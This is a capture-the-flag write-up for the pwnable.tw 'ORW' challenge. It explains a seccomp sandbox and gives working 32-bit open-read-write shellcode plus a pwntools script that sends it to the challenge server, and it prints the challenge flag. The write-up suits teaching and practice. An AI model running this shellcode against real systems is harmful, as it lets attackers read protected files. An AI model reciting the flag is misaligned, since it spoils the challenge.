---
layout: page
title: "ORW"
major_type: CTF
parent_group: pwnable.tw
summary: "Writing open-read-write shellcode to bypass Seccomp restrictions on a 32-bit ELF binary."
---

**Flag:** `FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

## Binary Analysis

We start by analyzing the basic properties of the binary using `file` and `checksec`.

```bash
$ file orw
orw: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, not stripped

$ checksec orw
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The binary is a 32-bit executable without PIE. It does have a stack canary, but importantly, the stack is marked as executable (`Has RWX segments`), suggesting we'll be dealing with shellcode execution rather than ROP.

When we run the binary, it prompts us for shellcode and then simply executes it (or segfaults if we provide junk):

```bash
$ ./orw
Give my your shellcode: AAAA
zsh: segmentation fault  ./orw
```

## Static Analysis & Seccomp

By looking into the decompilation of the program, we can see the `main` function:

```c
int main(void)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, shellcode, 200);
  (*(code *)shellcode)();
  return 0;
}
```

The program clearly reads up to 200 bytes of our shellcode into a buffer and then jumps to it. However, the first thing `main` does is call `orw_seccomp()`.

### The `orw_seccomp` Function

This function is responsible for installing a **seccomp** (secure computing mode) sandbox. Seccomp uses BPF (Berkeley Packet Filter) rules to determine which system calls the process is allowed to execute.

If we look at the raw BPF instructions being set up in `orw_seccomp()`, or by using a tool like `seccomp-tools`, we can see the exact restrictions:

```bash
$ seccomp-tools dump ./orw
```

The filter translates to the following logic:

```c
if (arch != AUDIT_ARCH_I386)
    KILL;

switch(syscall) {
    case read:          // 3
    case write:         // 4
    case open:          // 5
    case exit:          // 1
    case exit_group:    // 252
    case sigreturn:     // 119
    case rt_sigreturn:  // 173
        ALLOW;

    default:
        KILL;
}
```

This explains the challenge's name: **O**pen **R**ead **W**rite. Our standard shellcode uses the `execve` syscall (number 11) to spawn `/bin/sh`. Since `execve` is not in the allowed list, standard shellcode will cause the kernel to immediately kill our process with `SIGSYS` (bad system call).

## Exploitation Strategy

Since we cannot get an interactive shell, we must write a custom shellcode that reads the flag directly and prints it back to us. The goal is to:
1. `open("/home/orw/flag", O_RDONLY)`
2. `read(fd, buffer, size)`
3. `write(1, buffer, size)`

### Crafting the ORW Shellcode

We can write this in 32-bit x86 assembly. 

**Step 1: Open**
We need to push the string `"/home/orw/flag"` onto the stack, null-terminated. Since it's a 14-byte string, we need to pad it or structure it to fit nicely into 4-byte pushes.

```nasm
/* open("/home/orw/flag", O_RDONLY) */
xor eax, eax
push eax                /* null terminator */
push 0x67616c66         /* "flag" (reversed) */
push 0x2f77726f         /* "orw/" (reversed) */
push 0x2f656d6f         /* "ome/" (reversed) */
push 0x682f2f2f         /* "///h" (reversed) -> "/home/orw/flag" */
mov ebx, esp            /* ebx = pointer to path string */
xor ecx, ecx            /* O_RDONLY flag (0) */
xor edx, edx            /* mode (0) */
mov al, 5               /* syscall 5 is open */
int 0x80
```
*Note: We used `///h` to ensure the string aligns to 4-byte blocks. Multiple slashes in a path are treated as a single slash by the kernel.*

**Step 2: Read**
The `open` syscall returns the file descriptor in `eax`. We'll pass that to `read`.

```nasm
/* read(fd, buf, 64) */
mov ebx, eax            /* Move fd from eax to ebx */
sub esp, 0x40           /* Allocate 64 bytes on the stack for the buffer */
mov ecx, esp            /* ecx points to our new buffer */
mov dl, 0x40            /* Read 64 bytes */
xor eax, eax            
mov al, 3               /* syscall 3 is read */
int 0x80
```

**Step 3: Write**
The `read` syscall returns the number of bytes read in `eax`. We'll use this length to write to stdout (fd 1).

```nasm
/* write(1, buf, bytes_read) */
mov edx, eax            /* Size to write */
mov bl, 1               /* fd 1 is stdout */
mov ecx, esp            /* Pointer to buffer is still in esp */
mov al, 4               /* syscall 4 is write */
int 0x80
```

## Final Exploit Script

We can construct this assembly easily using `pwntools`' `asm` feature.

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

# Connect to remote server
p = remote('chall.pwnable.tw', 10001)

# Craft the assembly
shellcode = asm("""
    /* open("/home/orw/flag", O_RDONLY) */
    xor eax, eax
    push eax
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 5
    int 0x80

    /* read(fd, buf, 64) */
    mov ebx, eax
    sub esp, 0x40
    mov ecx, esp
    mov dl, 0x40
    xor eax, eax
    mov al, 3
    int 0x80

    /* write(1, buf, bytes_read) */
    mov edx, eax
    mov bl, 1
    mov ecx, esp
    mov al, 4
    int 0x80
""")

p.recvuntil(b"Give my your shellcode:")
p.send(shellcode)

# Receive the flag
print(p.recvall(timeout=5).decode('utf-8'))
```

Running the script connects to the remote server, sends our carefully crafted seccomp-bypassing shellcode, reads the file, and prints out our flag!
